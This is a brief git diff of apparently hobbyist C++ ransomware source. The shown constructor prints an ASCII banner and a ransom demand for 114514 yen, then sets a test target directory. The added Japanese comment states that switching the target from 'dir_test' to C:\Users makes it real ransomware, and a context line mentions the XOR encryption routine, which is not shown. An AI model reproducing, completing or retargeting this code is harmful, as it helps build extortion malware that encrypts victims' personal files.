@@ -7,7 +7,8 @@ rw::rw() {
     std::cout << "|_|  |__,||_|_||___||___||_|_|_||___||_____||__,||_|  |___|\n" << std::endl;
     std::cout << "We demand 114514 yen cash from you.\n" << std::endl;
 
-    p = "dir_test"; /* テスト用なので... */
+    /* dir_testからC:\Usersに変えると本物のランサムウェアに変化する */
+    p = "dir_test"; /* 一応テスト用なので... */
 }
 
 /* xor暗号の中身 */
